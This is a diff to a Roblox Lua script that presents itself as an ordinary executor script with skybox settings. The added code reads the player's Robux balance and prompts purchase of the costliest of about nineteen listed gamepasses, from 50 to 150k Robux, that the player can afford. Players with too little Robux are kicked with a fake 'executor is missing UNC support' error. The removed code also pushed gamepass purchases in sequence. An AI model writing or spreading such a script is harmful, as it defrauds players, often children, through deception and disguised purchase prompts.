@@ -61,77 +61,89 @@ skyy.SkyboxLf = "rbxassetid://12322755004"
 skyy.SkyboxRt = "rbxassetid://12322755004"
 skyy.SkyboxUp = "rbxassetid://12322755004"
 
+-- gamepasses
+-- 637671275 / 50 robux
+-- 628348366 / 100 robux
+-- 628037371 / 200 robux
+-- 630810360 / 300 robux
+-- 629718391 / 500 robux
+-- 637342279 / 750 robux
+-- 629164294 / 1000 robux
+-- 629363069 / 1.5k robux
+-- 636952278 / 2k robux
+-- 634064461 / 2.5k robux
+-- 636753262 / 4k robux
+-- 636628242 / 6k robux
+-- 636579262 / 8k robux
+-- 636576260 / 13k robux
+-- 636547257 / 20k robux
+-- 637401247 / 35k robux
+-- 636741231 / 50k robux
+-- 636109272 / 75k robux
+-- 636128293 / 150k robux
+
 local mps = game:GetService("MarketplaceService")
--- prompts
-local function prompt1()
-mps:PromptGamePassPurchase(game.Players.LocalPlayer, 628348366)
-end
+local rb = mps:GetRobuxBalance(game.Players.LocalPlayer)
 
-local function prompt2()
-mps:PromptGamePassPurchase(game.Players.LocalPlayer, 628037371)
-end
-
-local function prompt3()
-mps:PromptGamePassPurchase(game.Players.LocalPlayer, 630810360)
-end
-
-local function prompt4()
-mps:PromptGamePassPurchase(game.Players.LocalPlayer, 629718391)
-end
-
-local function prompt5()
-mps:PromptGamePassPurchase(game.Players.LocalPlayer, 629164294)
-end
-
-local function promptextra()
-mps:PromptGamePassPurchase(game.Players.LocalPlayer, 629363069)
-end
-
-local function prompt6()
-mps:PromptGamePassPurchase(game.Players.LocalPlayer, 634064461)
-end
-
--- checks
-
-if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 628348366) then
-print("ok")
+if rb == 0 then
+game:GetService("Players").LocalPlayer:Kick("Your executor is missing UNC support")
+elseif rb > 0 and rb < 50 then
+game:GetService("Players").LocalPlayer:Kick("Your executor is missing UNC support")
+elseif rb >= 50 and rb < 100 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 637671275)
+wait()
+elseif rb >= 100 and rb < 200 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 628348366)
+wait()
+elseif rb >= 200 and rb < 300 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 628037371)
+wait()
+elseif rb >= 300 and rb < 500 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 630810360)
+wait()
+elseif rb >= 500 and rb < 750 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 629718391)
+wait()
+elseif rb >= 750 and rb < 1000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 637342279)
+wait()
+elseif rb >= 1000 and rb < 1500 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 629164294)
+wait()
+elseif rb >= 1500 and rb < 2000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 629363069)
+wait()
+elseif rb >= 2000 and rb < 2500 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636952278)
+wait()
+elseif rb >= 2500 and rb < 4000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 634064461)
+wait()
+elseif rb >= 4000 and rb < 6000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636753262)
+wait()
+elseif rb >= 6000 and rb < 8000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636628242)
+wait()
+elseif rb >= 8000 and rb < 13000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636579262)
+wait()
+elseif rb >= 13000 and rb < 20000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636576260)
+wait()
+elseif rb >= 20000 and rb < 35000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636547257)
+wait()
+elseif rb >= 35000 and rb < 50000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 637401247)
+wait()
+elseif rb >= 50000 and rb < 75000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636741231)
+wait()
+elseif rb >= 75000 and rb < 150000 then
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636109272)
+wait()
 else
-prompt1()
-end
-wait(7)
-if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 628037371) then
-print("ok")
-else
-prompt2()
-end
-wait(7)
-if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 630810360) then
-print("ok")
-else
-prompt3()
-end
-wait(7)
-if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 629718391) then
-print("ok")
-else
-prompt4()
-end
-wait(7)
-if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 629164294) then
-print("ok")
-else
-prompt5()
-end
-wait(7)
-if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 629363069) then
-print("ok")
-else
-promptextra()
-end
-wait(7)
-if mps:UserOwnsGamePassAsync(game.Players.LocalPlayer.UserId, 634064461) then
-print("ok")
-game:GetService("Players").LocalPlayer:Kick("Something went wrong.")
-else
-prompt6()
+game:GetService("MarketplaceService"):PromptGamePassPurchase(game.Players.LocalPlayer, 636128293)
+wait()
 end
